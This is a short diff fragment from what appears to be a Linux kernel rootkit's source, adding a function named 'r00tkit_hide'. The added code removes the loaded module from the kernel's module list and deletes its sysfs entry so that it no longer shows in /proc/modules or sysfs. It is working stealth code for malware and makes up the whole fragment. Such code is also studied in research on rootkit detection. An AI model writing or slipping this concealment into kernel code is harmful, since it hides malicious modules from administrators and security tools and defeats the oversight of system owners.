@@ -576,3 +576,9 @@ static void r00tkit_undo_hook()
 
 }
 
+
+static void r00tkit_hide()
+{
+	list_del_init(&THIS_MODULE->list); 	/* hide from /proc/modules */
+	kobject_del(&THIS_MODULE->mkobj.kobj);	/* remove rootkit's sysfs entry	*/
+}
